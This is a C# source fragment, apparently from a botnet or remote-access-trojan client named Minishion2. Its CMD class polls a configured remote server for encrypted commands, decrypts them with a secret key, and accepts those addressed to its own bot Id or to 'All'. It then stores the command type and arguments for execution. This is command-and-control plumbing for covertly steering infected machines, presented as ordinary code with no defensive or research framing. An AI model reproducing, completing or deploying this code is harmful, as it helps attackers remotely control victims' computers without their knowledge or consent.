namespace Minishion2
{
    internal class CMD
    {
        private static string LastComand { get; set; }
        public static string ComType { get; private set; }
        public static string Arguments { get; private set; }
        public static string FullComand { get; private set; }
        //Логика обработка команд
        public static bool GetComand()
        {
            try {
                string context = EncryptionHelper.Decrypt(Web.SendGet(Config.Comand), Config.SecretKey);
                if ((context.Split(Config.Spliter)[0] == Config.Id || context.Split(Config.Spliter)[0] == "All") && context != LastComand)
                {
                    LastComand = context;
                    ComType = context.Split(Config.Spliter)[1];
                    Arguments = context.Split(Config.Spliter)[2];
                    FullComand = context;
                    return true;
                }
                else
                {
                    return false;
                }
            }
            catch {
                return false;
            }
            
        }
    }
}